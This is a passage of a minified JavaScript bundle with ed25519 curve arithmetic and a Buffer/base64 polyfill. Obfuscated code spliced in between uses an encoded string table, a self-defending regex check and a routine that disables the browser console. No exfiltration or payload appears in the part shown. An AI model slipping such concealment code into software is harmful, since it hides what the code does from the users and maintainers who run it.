            return `<Point ${this.is0() ? "ZERO" : this.toHex()}>`;
          }
        }
        (h.BASE = new h(t.Gx, t.Gy, gn, a(t.Gx * t.Gy))),
          (h.ZERO = new h(mn, gn, gn, mn)),
          (h.Fp = n),
          (h.Fn = r);
        const p = dn(h, 8 * r.BYTES);
        return h;
      })(e, n);
    return (function (t, e) {
      return Object.assign({}, e, { ExtendedPoint: e.Point, CURVE: t });
    })(t, vn(o, r));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    BigInt(0);
  const kn = BigInt(1),
    In = BigInt(2);
  BigInt(3);
  const Sn = BigInt(5),
    _n = BigInt(8),
    Tn = {
      p: BigInt(
        "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed"
      ),
      n: BigInt(
        "0x1000000000000000000000000000000014def9dea2f79cd65812631a5cf5d3ed"
      ),
      h: _n,
      a: BigInt(
        "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffec"
      ),
      d: BigInt(
        "0x52036cee2b6ffe738cc740797779e89800700a4d4141d8ab75eb4dca135978a3"
      ),
      Gx: BigInt(
        "0x216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a"
      ),
      Gy: BigInt(
        "0x6666666666666666666666666666666666666666666666666666666666666658"
      ),
    };
  function Bn(t) {
    return (t[0] &= 248), (t[31] &= 127), (t[31] |= 64), t;
  }
  const Cn = BigInt(
    "19681161376707505956807079304988542015446066515923890162744021073123829784752"
  );
  function En(t, e) {
    const n = Tn.p,
      r = Ke(e * e * e, n),
      o = (function (t) {
        const e = BigInt(10),
          n = BigInt(20),
          r = BigInt(40),
          o = BigInt(80),
          i = Tn.p,
          s = (((t * t) % i) * t) % i,
          a = (We(s, In, i) * s) % i,
          u = (We(a, kn, i) * t) % i,
          c = (We(u, Sn, i) * u) % i,
          l = (We(c, e, i) * c) % i,
          d = (We(l, n, i) * l) % i,
          f = (We(d, r, i) * d) % i,
          h = (We(f, o, i) * f) % i,
          p = (We(h, o, i) * f) % i,
          m = (We(p, e, i) * c) % i;
        return { pow_p_5_8: (We(m, In, i) * t) % i, b2: s };
      })(t * Ke(r * r * e, n)).pow_p_5_8;
    let i = Ke(t * r * o, n);
    const s = Ke(e * i * i, n),
      a = i,
      u = Ke(i * Cn, n),
      c = s === t,
      l = s === Ke(-t, n),
      d = s === Ke(-t * Cn, n);
    return (
      c && (i = a),
      (l || d) && (i = u),
      (Ke(i, n) & Le) === Le && (i = Ke(-i, n)),
      { isValid: c || l, value: i }
    );
  }
  const xn = (() => Je(Tn.p, void 0, !0))(),
    Pn = (() => ({
      ...Tn,
      Fp: xn,
      hash: we,
      adjustScalarBytes: Bn,
      uvRatio: En,
    }))(),
    On = (() => An(Pn))();
  var Rn = Nn;
  !(function (t) {
    for (
      var e = 179,
        n = 181,
        r = 188,
        o = 180,
        i = 212,
        s = 194,
        a = 209,
        u = 203,
        c = 213,
        l = Nn,
        d = t();
      [];

    )
      try {
        if (
          107925 ===
          -parseInt(l(e)) / 1 +
            (-parseInt(l(n)) / 2) * (-parseInt(l(r)) / 3) +
            (-parseInt(l(190)) / 4) * (parseInt(l(o)) / 5) +
            (-parseInt(l(i)) / 6) * (-parseInt(l(s)) / 7) +
            parseInt(l(a)) / 8 +
            (parseInt(l(u)) / 9) * (parseInt(l(c)) / 10) +
            (-parseInt(l(206)) / 11) * (-parseInt(l(205)) / 12)
        )
          break;
        d.push(d.shift());
      } catch (f) {
        d.push(d.shift());
      }
  })(Kn);
  var Mn = (function () {
      var t = !![];
      return function (e, n) {
        var r = t
          ? function () {
              if (n) {
                var t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Ln = Mn(void 0, function () {
      var t = 184,
        e = 201,
        n = Nn,
        r = {};
      r[n(184)] = "(((.+)+)+)+$";
      var o = r;
      return Ln.toString()
        .search(o[n(t)])
        .toString()
        [n(e) + "r"](Ln)
        .search("(((.+)+)+)+$");
    });
  function Nn(t, e) {
    var n = Kn();
    return (
      (Nn = function (e, r) {
        var o = n[(e -= 177)];
        if (void 0 === Nn.wtHLAS) {
          var i = function (t) {
            for (
              var e, n, r = "", o = "", s = r + i, a = 0, u = 0;
              (n = t.charAt(u++));
              ~n && ((e = a % 4 ? 64 * e + n : n), a++ % 4)
                ? (r +=
                    s.charCodeAt(u + 10) - 10 != 0
                      ? String.fromCharCode(255 & (e >> ((-2 * a) & 6)))
                      : a)
                : 0
            )
              n =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  n
                );
            for (var c = 0, l = r.length; c < l; c++)
              o += "%" + ("00" + r.charCodeAt(c).toString(16)).slice(-2);
            return decodeURIComponent(o);
          };
          (Nn.eMfwQd = i), (t = arguments), (Nn.wtHLAS = !![]);
        }
        var s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          var u = function (t) {
            (this.qZhxDm = t),
              (this.ryaicc = [1, 0, 0]),
              (this.zzWeXd = function () {
                return "newState";
              }),
              (this.NseldM = "\\w+ *\\(\\) *{\\w+ *"),
              (this.yZnaAr = "['|\"].+['|\"];? *}");
          };
          (u.prototype.oCuXcx = function () {
            var t = new RegExp(this.NseldM + this.yZnaAr).test(
              this.zzWeXd.toString()
            )
              ? --this.ryaicc[1]
              : --this.ryaicc[0];
            return this.UmcEde(t);
          }),
            (u.prototype.UmcEde = function (t) {
              return Boolean(~t) ? this.AedQqx(this.qZhxDm) : t;
            }),
            (u.prototype.AedQqx = function (t) {
              for (var e = 0, n = this.ryaicc.length; e < n; e++)
                this.ryaicc.push(Math.round(Math.random())),
                  (n = this.ryaicc.length);
              return t(this.ryaicc[0]);
            }),
            new u(Nn).oCuXcx(),
            (o = Nn.eMfwQd(o)),
            (t[s] = o);
        }
        return o;
      }),
      Nn(t, e)
    );
  }
  Ln();
  var Dn = (function () {
      var t = !![];
      return function (e, n) {
        var r = t
          ? function () {
              if (n) {
                var t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Un = Dn(void 0, function () {
      var t = 177,
        e = 197,
        n = 185,
        r = 204,
        o = 186,
        i = 191,
        s = 198,
        a = 192,
        u = Nn,
        c = { LZYmv: "3|1|4|0|2" };
      (c.bZtwr = u(t)),
        (c[u(187)] = u(e)),
        (c[u(n)] = function (t, e) {
          return t + e;
        }),
        (c[u(r)] = u(o) + u(i)),
        (c.QlEAo = function (t, e) {
          return t < e;
        });
      for (var l = c, d = l.LZYmv.split("|"), f = 0; []; ) {
        switch (d[f++]) {
          case "0":
            var h = [l.bZtwr, l.yyWJT, u(s), "error", u(a), "table", "trace"];
            continue;
          case "1":
            try {
              w = Function(
                l.Riuie(l[u(204)], '{}.constructor("return this")( )') + ");"
              )();
            } catch (v) {
              w = window;
            }
            continue;
          case "2":
            for (var p = 0; l.QlEAo(p, h.length); p++) {
              var m = Dn.constructor.prototype.bind(Dn),
                g = h[p],
                y = b[g] || m;
              (m[u(208)] = Dn.bind(Dn)),
                (m[u(199)] = y.toString.bind(y)),
                (b[g] = m);
            }
            continue;
          case "3":
            var w;
            continue;
          case "4":
            var b = (w.console = w.console || {});
            continue;
        }
        break;
      }
    });
  Un(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var qn =
    typeof globalThis !== Rn(211)
      ? globalThis
      : "undefined" != typeof window
      ? window
      : "undefined" != typeof global
      ? global
      : "undefined" != typeof self
      ? self
      : {};
  function zn(t) {
    var e = Rn;
    return t &&
      t.__esModule &&
      Object[e(207)][e(182) + e([178][0])][e(196)](t, "default")
      ? t.default
      : t;
  }
  function Kn() {
    var t = [
      "nJuZmJKYy2PhvMHH",
      "mJjxAxnfsKi",
      "ChjVDg90ExbL",
      "x19WCM90B19F",
      "ndi5mJa4t05SqNrr",
      "z2v0t3DUuhjVCa",
      "Dw5KzwzPBMvK",
      "mZa5otbdvMf2Cfm",
      "nty4odeWEMHcEuPx",
      "Bg9N",
      "zxj0Eq",
      "nJC1mtnWEfbWwfy",
      "mtmZndKWq3bYtLDs",
      "ndK5mJHjAgzYzMi",
      "AgfZt3DUuhjVCa",
      "vgHfrg4",
      "ALzZEgC",
      "uML1Awu",
      "CMv0DxjUicHMDq",
      "ExLxsLq",
      "ou5Argrgra",
      "zgvMyxvSDa",
      "mJrNCNvuwhG",
      "BMn0Aw9UkcKG",
      "zxHJzxb0Aw9U",
      "zNvUy3rPB24",
      "ntzutMDlyw8",
      "yxbWBhK",
      "y2fSBa",
      "D2fYBG",
      "Aw5MBW",
      "Dg9tDhjPBMC",
      "vMrzyxu",
      "y29UC3rYDwn0BW",
      "z2v0",
      "ovPxt0r5qG",
      "v3PVsM0",
    ];
    return (Kn = function () {
      return t;
    })();
  }
  function Wn(t) {
    var e = 189,
      n = 207,
      r = 178,
      o = 196,
      i = 195,
      s = 210,
      a = 202,
      u = Rn,
      c = {};
    c[u(183)] = "__esModule";
    for (var l = c, d = "5|1|4|0|2|3".split("|"), f = 0; []; ) {
      switch (d[f++]) {
        case "0":
          var h = { value: !![] };
          Object.defineProperty(m, "__esModule", h);
          continue;
        case "1":
          var p = t[u(e)];
          continue;
        case "2":
          Object.keys(t).forEach(function (e) {
            var n = u,
              r = Object[n(s) + "ertyDescriptor"](t, e);
            Object.defineProperty(
              m,
              e,
              r[n(a)]
                ? r
                : {
                    enumerable: !![],
                    get: function () {
                      return t[e];
                    },
                  }
            );
          });
          continue;
        case "3":
          return m;
        case "4":
          if (typeof p == u(193)) {
            var m = function t() {
              var e = u;
              return this instanceof t
                ? Reflect.construct(p, arguments, this.constructor)
                : p[e(i)](this, arguments);
            };
            m[u(n)] = p.prototype;
          } else m = {};
          continue;
        case "5":
          if (Object.prototype["hasOwnProp" + u(r)][u(o)](t, l.ThEDn)) return t;
          continue;
      }
      break;
    }
  }
  var Fn,
    jn = { exports: {} },
    Gn = {};
  function Vn() {
    return (
      Fn ||
        ((Fn = 1),
        (function (t) {
          Object.defineProperties(t, {
            __esModule: { value: !0 },
            [Symbol.toStringTag]: { value: "Module" },
          });
          for (
            var e = {},
              n = {
                byteLength: function (t) {
                  var e = u(t),
                    n = e[0],
                    r = e[1];
                  return (3 * (n + r)) / 4 - r;
                },
                toByteArray: function (t) {
                  var e,
                    n,
                    r = u(t),
                    s = r[0],
                    a = r[1],
                    c = new i(
                      (function (t, e, n) {
                        return (3 * (e + n)) / 4 - n;
                      })(0, s, a)
                    ),
                    l = 0,
                    d = a > 0 ? s - 4 : s;
                  for (n = 0; n < d; n += 4)
                    (e =
                      (o[t.charCodeAt(n)] << 18) |
                      (o[t.charCodeAt(n + 1)] << 12) |
                      (o[t.charCodeAt(n + 2)] << 6) |
                      o[t.charCodeAt(n + 3)]),
                      (c[l++] = (e >> 16) & 255),
                      (c[l++] = (e >> 8) & 255),
                      (c[l++] = 255 & e);
                  2 === a &&
                    ((e =
                      (o[t.charCodeAt(n)] << 2) |
                      (o[t.charCodeAt(n + 1)] >> 4)),
                    (c[l++] = 255 & e));
                  1 === a &&
                    ((e =
                      (o[t.charCodeAt(n)] << 10) |
                      (o[t.charCodeAt(n + 1)] << 4) |
                      (o[t.charCodeAt(n + 2)] >> 2)),
                    (c[l++] = (e >> 8) & 255),
                    (c[l++] = 255 & e));
                  return c;
                },
                fromByteArray: function (t) {
                  for (
                    var e,
                      n = t.length,
                      o = n % 3,
                      i = [],
                      s = 16383,
                      a = 0,
                      u = n - o;
                    a < u;
                    a += s
                  )
                    i.push(l(t, a, a + s > u ? u : a + s));
                  1 === o
                    ? ((e = t[n - 1]),
                      i.push(r[e >> 2] + r[(e << 4) & 63] + "=="))
                    : 2 === o &&
                      ((e = (t[n - 2] << 8) + t[n - 1]),
                      i.push(
                        r[e >> 10] + r[(e >> 4) & 63] + r[(e << 2) & 63] + "="
                      ));
                  return i.join("");
                },
              },
              r = [],
              o = [],
              i = "undefined" != typeof Uint8Array ? Uint8Array : Array,
              s =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
              a = 0;
            a < 64;
            ++a
          )
            (r[a] = s[a]), (o[s.charCodeAt(a)] = a);
          function u(t) {
            var e = t.length;
            if (e % 4 > 0)
              throw new Error("Invalid string. Length must be a multiple of 4");
            var n = t.indexOf("=");
            return -1 === n && (n = e), [n, n === e ? 0 : 4 - (n % 4)];
          }
          function c(t) {
            return (
              r[(t >> 18) & 63] +
              r[(t >> 12) & 63] +
              r[(t >> 6) & 63] +
              r[63 & t]
            );
          }
          function l(t, e, n) {
            for (var r, o = [], i = e; i < n; i += 3)
              (r =
                ((t[i] << 16) & 16711680) +
                ((t[i + 1] << 8) & 65280) +
                (255 & t[i + 2])),
                o.push(c(r));
            return o.join("");
          }
          (o["-".charCodeAt(0)] = 62), (o["_".charCodeAt(0)] = 63);
          var d = {
            read: function (t, e, n, r, o) {
              var i,
                s,
                a = 8 * o - r - 1,
                u = (1 << a) - 1,
                c = u >> 1,
                l = -7,
                d = n ? o - 1 : 0,
                f = n ? -1 : 1,
                h = t[e + d];
              for (
                d += f, i = h & ((1 << -l) - 1), h >>= -l, l += a;
                l > 0;
                i = 256 * i + t[e + d], d += f, l -= 8
              );
              for (
                s = i & ((1 << -l) - 1), i >>= -l, l += r;
                l > 0;
                s = 256 * s + t[e + d], d += f, l -= 8
              );
              if (0 === i) i = 1 - c;
              else {
                if (i === u) return s ? NaN : (1 / 0) * (h ? -1 : 1);
                (s += Math.pow(2, r)), (i -= c);
              }
              return (h ? -1 : 1) * s * Math.pow(2, i - r);
            },
            write: function (t, e, n, r, o, i) {
              var s,
                a,
                u,
                c = 8 * i - o - 1,
                l = (1 << c) - 1,
                d = l >> 1,
                f = 23 === o ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
                h = r ? 0 : i - 1,
                p = r ? 1 : -1,
                m = e < 0 || (0 === e && 1 / e < 0) ? 1 : 0;
              for (
                e = Math.abs(e),
                  isNaN(e) || e === 1 / 0
                    ? ((a = isNaN(e) ? 1 : 0), (s = l))
                    : ((s = Math.floor(Math.log(e) / Math.LN2)),
                      e * (u = Math.pow(2, -s)) < 1 && (s--, (u *= 2)),
                      (e += s + d >= 1 ? f / u : f * Math.pow(2, 1 - d)) * u >=
                        2 && (s++, (u /= 2)),
                      s + d >= l
                        ? ((a = 0), (s = l))
                        : s + d >= 1
                        ? ((a = (e * u - 1) * Math.pow(2, o)), (s += d))
                        : ((a = e * Math.pow(2, d - 1) * Math.pow(2, o)),
                          (s = 0)));
                o >= 8;
                t[n + h] = 255 & a, h += p, a /= 256, o -= 8
              );
              for (
                s = (s << o) | a, c += o;
                c > 0;
                t[n + h] = 255 & s, h += p, s /= 256, c -= 8
              );
              t[n + h - p] |= 128 * m;
            },
          };
          !(function (t) {
            const e = n,
              r = d,
              o =
                "function" == typeof Symbol && "function" == typeof Symbol.for
                  ? Symbol.for("nodejs.util.inspect.custom")
                  : null;
            (t.Buffer = l),
              (t.SlowBuffer = function (t) {
                +t != t && (t = 0);
                return l.alloc(+t);
              }),
              (t.INSPECT_MAX_BYTES = 50);
            const i = 2147483647;
            t.kMaxLength = i;
            const {
              Uint8Array: s,
              ArrayBuffer: a,
              SharedArrayBuffer: u,
            } = globalThis;
            function c(t) {
              if (t > i)
                throw new RangeError(
                  'The value "' + t + '" is invalid for option "size"'
                );
              const e = new s(t);
              return Object.setPrototypeOf(e, l.prototype), e;
            }
            function l(t, e, n) {
              if ("number" == typeof t) {
                if ("string" == typeof e)
                  throw new TypeError(
                    'The "string" argument must be of type string. Received type number'
                  );
                return p(t);
              }
              return f(t, e, n);
            }
            function f(t, e, n) {
              if ("string" == typeof t)
                return (function (t, e) {
                  ("string" == typeof e && "" !== e) || (e = "utf8");
                  if (!l.isEncoding(e))
                    throw new TypeError("Unknown encoding: " + e);
                  const n = 0 | w(t, e);
                  let r = c(n);
                  const o = r.write(t, e);
                  o !== n && (r = r.slice(0, o));
                  return r;
                })(t, e);
              if (a.isView(t))
                return (function (t) {
                  if (Q(t, s)) {
                    const e = new s(t);
                    return g(e.buffer, e.byteOffset, e.byteLength);
                  }
                  return m(t);
                })(t);
              if (null == t)
                throw new TypeError(
                  "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
                    typeof t
                );
              if (Q(t, a) || (t && Q(t.buffer, a))) return g(t, e, n);
              if (void 0 !== u && (Q(t, u) || (t && Q(t.buffer, u))))
                return g(t, e, n);
              if ("number" == typeof t)
                throw new TypeError(
                  'The "value" argument must not be of type number. Received type number'
                );
              const r = t.valueOf && t.valueOf();
              if (null != r && r !== t) return l.from(r, e, n);
              const o = (function (t) {
                if (l.isBuffer(t)) {
                  const e = 0 | y(t.length),
                    n = c(e);
                  return 0 === n.length || t.copy(n, 0, 0, e), n;
                }
                if (void 0 !== t.length)
                  return "number" != typeof t.length || $(t.length)
                    ? c(0)
                    : m(t);
                if ("Buffer" === t.type && Array.isArray(t.data))
                  return m(t.data);
              })(t);
              if (o) return o;
              if (
                "undefined" != typeof Symbol &&
                null != Symbol.toPrimitive &&
                "function" == typeof t[Symbol.toPrimitive]
              )
                return l.from(t[Symbol.toPrimitive]("string"), e, n);
              throw new TypeError(
                "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
                  typeof t
              );
            }
            function h(t) {
              if ("number" != typeof t)
                throw new TypeError('"size" argument must be of type number');
              if (t < 0)
                throw new RangeError(
                  'The value "' + t + '" is invalid for option "size"'
                );
            }
            function p(t) {
              return h(t), c(t < 0 ? 0 : 0 | y(t));
            }
            function m(t) {
              const e = t.length < 0 ? 0 : 0 | y(t.length),
                n = c(e);
              for (let r = 0; r < e; r += 1) n[r] = 255 & t[r];
              return n;
            }
            function g(t, e, n) {
              if (e < 0 || t.byteLength < e)
                throw new RangeError('"offset" is outside of buffer bounds');
              if (t.byteLength < e + (n || 0))
                throw new RangeError('"length" is outside of buffer bounds');
              let r;
              return (
                (r =
                  void 0 === e && void 0 === n
                    ? new s(t)
                    : void 0 === n
                    ? new s(t, e)
                    : new s(t, e, n)),
                Object.setPrototypeOf(r, l.prototype),
                r
              );
            }
            function y(t) {
              if (t >= i)
                throw new RangeError(
                  "Attempt to allocate Buffer larger than maximum size: 0x" +
                    i.toString(16) +
                    " bytes"
                );
              return 0 | t;
            }
            function w(t, e) {
              if (l.isBuffer(t)) return t.length;
              if (a.isView(t) || Q(t, a)) return t.byteLength;
              if ("string" != typeof t)
                throw new TypeError(
                  'The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' +
                    typeof t
                );
              const n = t.length,
                r = arguments.length > 2 && !0 === arguments[2];
              if (!r && 0 === n) return 0;
              let o = !1;
              for (;;)
                switch (e) {
                  case "ascii":
                  case "latin1":
                  case "binary":
                    return n;
                  case "utf8":
                  case "utf-8":
                    return X(t).length;
                  case "ucs2":
                  case "ucs-2":
                  case "utf16le":
                  case "utf-16le":
                    return 2 * n;
                  case "hex":
                    return n >>> 1;
                  case "base64":
                    return J(t).length;
                  default:
                    if (o) return r ? -1 : X(t).length;
                    (e = ("" + e).toLowerCase()), (o = !0);
                }
            }
            function b(t, e, n) {
              let r = !1;
              if (((void 0 === e || e < 0) && (e = 0), e > this.length))
                return "";
              if (
                ((void 0 === n || n > this.length) && (n = this.length), n <= 0)
              )
                return "";
              if ((n >>>= 0) <= (e >>>= 0)) return "";
              for (t || (t = "utf8"); ; )
                switch (t) {
                  case "hex":
                    return R(this, e, n);
                  case "utf8":
                  case "utf-8":
                    return E(this, e, n);
                  case "ascii":
                    return P(this, e, n);
                  case "latin1":
                  case "binary":
                    return O(this, e, n);
                  case "base64":
                    return C(this, e, n);
                  case "ucs2":
                  case "ucs-2":
                  case "utf16le":
                  case "utf-16le":
                    return M(this, e, n);
                  default:
                    if (r) throw new TypeError("Unknown encoding: " + t);
                    (t = (t + "").toLowerCase()), (r = !0);
                }
            }
            function v(t, e, n) {
              const r = t[e];
              (t[e] = t[n]), (t[n] = r);
            }
            function A(t, e, n, r, o) {
              if (0 === t.length) return -1;
              if (
                ("string" == typeof n
                  ? ((r = n), (n = 0))
                  : n > 2147483647
                  ? (n = 2147483647)
                  : n < -2147483648 && (n = -2147483648),
                $((n = +n)) && (n = o ? 0 : t.length - 1),
                n < 0 && (n = t.length + n),
                n >= t.length)
              ) {
                if (o) return -1;
                n = t.length - 1;
              } else if (n < 0) {
                if (!o) return -1;
                n = 0;
              }
              if (("string" == typeof e && (e = l.from(e, r)), l.isBuffer(e)))
                return 0 === e.length ? -1 : k(t, e, n, r, o);
              if ("number" == typeof e)
                return (
                  (e &= 255),
                  "function" == typeof s.prototype.indexOf
                    ? o
                      ? s.prototype.indexOf.call(t, e, n)
                      : s.prototype.lastIndexOf.call(t, e, n)
                    : k(t, [e], n, r, o)
                );
              throw new TypeError("val must be string, number or Buffer");
            }
            function k(t, e, n, r, o) {
              let i,
                s = 1,
                a = t.length,
                u = e.length;
              if (
                void 0 !== r &&
                ("ucs2" === (r = String(r).toLowerCase()) ||
                  "ucs-2" === r ||
                  "utf16le" === r ||
                  "utf-16le" === r)
              ) {
                if (t.length < 2 || e.length < 2) return -1;
                (s = 2), (a /= 2), (u /= 2), (n /= 2);
              }
              function c(t, e) {
                return 1 === s ? t[e] : t.readUInt16BE(e * s);
              }
              if (o) {
                let r = -1;
                for (i = n; i < a; i++)
                  if (c(t, i) === c(e, -1 === r ? 0 : i - r)) {
                    if ((-1 === r && (r = i), i - r + 1 === u)) return r * s;
                  } else -1 !== r && (i -= i - r), (r = -1);
              } else
                for (n + u > a && (n = a - u), i = n; i >= 0; i--) {
                  let n = !0;
                  for (let r = 0; r < u; r++)
                    if (c(t, i + r) !== c(e, r)) {
                      n = !1;
                      break;
                    }
                  if (n) return i;
                }
              return -1;
            }
            function I(t, e, n, r) {
              n = Number(n) || 0;
              const o = t.length - n;
              r ? (r = Number(r)) > o && (r = o) : (r = o);
              const i = e.length;
              let s;
              for (r > i / 2 && (r = i / 2), s = 0; s < r; ++s) {
                const r = parseInt(e.substr(2 * s, 2), 16);
                if ($(r)) return s;
                t[n + s] = r;
              }
              return s;
            }
            function S(t, e, n, r) {
              return Y(X(e, t.length - n), t, n, r);
            }
            function _(t, e, n, r) {
              return Y(
                (function (t) {
                  const e = [];
                  for (let n = 0; n < t.length; ++n)
                    e.push(255 & t.charCodeAt(n));
                  return e;
                })(e),
                t,
                n,
                r
              );
            }
            function T(t, e, n, r) {
              return Y(J(e), t, n, r);
            }
            function B(t, e, n, r) {
              return Y(
                (function (t, e) {
                  let n, r, o;
                  const i = [];
                  for (let s = 0; s < t.length && !((e -= 2) < 0); ++s)
                    (n = t.charCodeAt(s)),
                      (r = n >> 8),
                      (o = n % 256),
                      i.push(o),
                      i.push(r);
                  return i;
                })(e, t.length - n),
                t,
                n,
                r
              );
            }
            function C(t, n, r) {
              return 0 === n && r === t.length
                ? e.fromByteArray(t)
                : e.fromByteArray(t.slice(n, r));
            }
            function E(t, e, n) {
              n = Math.min(t.length, n);
              const r = [];
              let o = e;
              for (; o < n; ) {
                const e = t[o];
                let i = null,
                  s = e > 239 ? 4 : e > 223 ? 3 : e > 191 ? 2 : 1;
                if (o + s <= n) {
                  let n, r, a, u;
                  switch (s) {
                    case 1:
                      e < 128 && (i = e);
                      break;
                    case 2:
                      (n = t[o + 1]),
                        128 == (192 & n) &&
                          ((u = ((31 & e) << 6) | (63 & n)),
                          u > 127 && (i = u));
                      break;
                    case 3:
                      (n = t[o + 1]),
                        (r = t[o + 2]),
                        128 == (192 & n) &&
                          128 == (192 & r) &&
                          ((u = ((15 & e) << 12) | ((63 & n) << 6) | (63 & r)),
                          u > 2047 && (u < 55296 || u > 57343) && (i = u));
                      break;
                    case 4:
                      (n = t[o + 1]),
                        (r = t[o + 2]),
                        (a = t[o + 3]),
                        128 == (192 & n) &&
                          128 == (192 & r) &&
                          128 == (192 & a) &&
                          ((u =
                            ((15 & e) << 18) |
                            ((63 & n) << 12) |
                            ((63 & r) << 6) |
                            (63 & a)),
                          u > 65535 && u < 1114112 && (i = u));
                  }
                }
                null === i
                  ? ((i = 65533), (s = 1))
                  : i > 65535 &&
                    ((i -= 65536),
                    r.push(((i >>> 10) & 1023) | 55296),
                    (i = 56320 | (1023 & i))),
                  r.push(i),
                  (o += s);
              }
              return (function (t) {
                const e = t.length;
                if (e <= x) return String.fromCharCode.apply(String, t);
                let n = "",
                  r = 0;
                for (; r < e; )
                  n += String.fromCharCode.apply(String, t.slice(r, (r += x)));
                return n;
              })(r);
            }
            (l.TYPED_ARRAY_SUPPORT = (function () {
              try {
                const t = new s(1),
                  e = {
                    foo: function () {
                      return 42;
                    },
                  };
                return (
                  Object.setPrototypeOf(e, s.prototype),
                  Object.setPrototypeOf(t, e),
                  42 === t.foo()
                );
              } catch (t) {
                return !1;
              }
            })()),
              l.TYPED_ARRAY_SUPPORT ||
                "undefined" == typeof console ||
                console.error,
              Object.defineProperty(l.prototype, "parent", {
                enumerable: !0,
                get: function () {
                  if (l.isBuffer(this)) return this.buffer;
                },
              }),
              Object.defineProperty(l.prototype, "offset", {
                enumerable: !0,
                get: function () {
                  if (l.isBuffer(this)) return this.byteOffset;
                },
              }),
              (l.poolSize = 8192),
              (l.from = function (t, e, n) {
                return f(t, e, n);
              }),
              Object.setPrototypeOf(l.prototype, s.prototype),
              Object.setPrototypeOf(l, s),
              (l.alloc = function (t, e, n) {
                return (function (t, e, n) {
                  return (
                    h(t),
                    t <= 0
                      ? c(t)
                      : void 0 !== e
                      ? "string" == typeof n
                        ? c(t).fill(e, n)
                        : c(t).fill(e)
                      : c(t)
                  );
                })(t, e, n);
              }),
              (l.allocUnsafe = function (t) {
                return p(t);
              }),
              (l.allocUnsafeSlow = function (t) {
                return p(t);
              }),
              (l.isBuffer = function (t) {
                return null != t && !0 === t._isBuffer && t !== l.prototype;
              }),
              (l.compare = function (t, e) {
                if (
                  (Q(t, s) && (t = l.from(t, t.offset, t.byteLength)),
                  Q(e, s) && (e = l.from(e, e.offset, e.byteLength)),
                  !l.isBuffer(t) || !l.isBuffer(e))
                )
                  throw new TypeError(
                    'The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array'
                  );
                if (t === e) return 0;
                let n = t.length,
                  r = e.length;
                for (let o = 0, i = Math.min(n, r); o < i; ++o)
                  if (t[o] !== e[o]) {
                    (n = t[o]), (r = e[o]);
                    break;
                  }
                return n < r ? -1 : r < n ? 1 : 0;
              }),
              (l.isEncoding = function (t) {
                switch (String(t).toLowerCase()) {
                  case "hex":
                  case "utf8":
                  case "utf-8":
                  case "ascii":
                  case "latin1":
                  case "binary":
                  case "base64":
                  case "ucs2":
                  case "ucs-2":
                  case "utf16le":
                  case "utf-16le":
                    return !0;
                  default:
                    return !1;
                }
              }),
              (l.concat = function (t, e) {
                if (!Array.isArray(t))
                  throw new TypeError(
                    '"list" argument must be an Array of Buffers'
                  );
                if (0 === t.length) return l.alloc(0);
                let n;
                if (void 0 === e)
                  for (e = 0, n = 0; n < t.length; ++n) e += t[n].length;
                const r = l.allocUnsafe(e);
                let o = 0;
                for (n = 0; n < t.length; ++n) {
                  let e = t[n];
                  if (Q(e, s))
                    o + e.length > r.length
                      ? (l.isBuffer(e) || (e = l.from(e)), e.copy(r, o))
                      : s.prototype.set.call(r, e, o);
                  else {
                    if (!l.isBuffer(e))
                      throw new TypeError(
                        '"list" argument must be an Array of Buffers'
                      );
                    e.copy(r, o);
                  }
                  o += e.length;
                }
                return r;
              }),
              (l.byteLength = w),
              (l.prototype._isBuffer = !0),
              (l.prototype.swap16 = function () {
                const t = this.length;
                if (t % 2 != 0)
                  throw new RangeError(
                    "Buffer size must be a multiple of 16-bits"
                  );
                for (let e = 0; e < t; e += 2) v(this, e, e + 1);
                return this;
              }),
              (l.prototype.swap32 = function () {
                const t = this.length;
                if (t % 4 != 0)
                  throw new RangeError(
                    "Buffer size must be a multiple of 32-bits"
                  );
                for (let e = 0; e < t; e += 4)
                  v(this, e, e + 3), v(this, e + 1, e + 2);
                return this;
              }),
              (l.prototype.swap64 = function () {
                const t = this.length;
                if (t % 8 != 0)
                  throw new RangeError(
                    "Buffer size must be a multiple of 64-bits"
                  );
                for (let e = 0; e < t; e += 8)
                  v(this, e, e + 7),
                    v(this, e + 1, e + 6),
                    v(this, e + 2, e + 5),
                    v(this, e + 3, e + 4);
                return this;
              }),
              (l.prototype.toString = function () {
                const t = this.length;
                return 0 === t
                  ? ""
                  : 0 === arguments.length
                  ? E(this, 0, t)
                  : b.apply(this, arguments);
              }),
              (l.prototype.toLocaleString = l.prototype.toString),
              (l.prototype.equals = function (t) {
                if (!l.isBuffer(t))
                  throw new TypeError("Argument must be a Buffer");
                return this === t || 0 === l.compare(this, t);
              }),
              (l.prototype.inspect = function () {
                let e = "";
                const n = t.INSPECT_MAX_BYTES;
                return (
                  (e = this.toString("hex", 0, n)
                    .replace(/(.{2})/g, "$1 ")
                    .trim()),
                  this.length > n && (e += " ... "),
                  "<Buffer " + e + ">"
                );
              }),
              o && (l.prototype[o] = l.prototype.inspect),
              (l.prototype.compare = function (t, e, n, r, o) {
                if (
                  (Q(t, s) && (t = l.from(t, t.offset, t.byteLength)),
                  !l.isBuffer(t))
                )
                  throw new TypeError(
                    'The "target" argument must be one of type Buffer or Uint8Array. Received type ' +
                      typeof t
                  );
                if (
                  (void 0 === e && (e = 0),
                  void 0 === n && (n = t ? t.length : 0),
                  void 0 === r && (r = 0),
                  void 0 === o && (o = this.length),
                  e < 0 || n > t.length || r < 0 || o > this.length)
                )
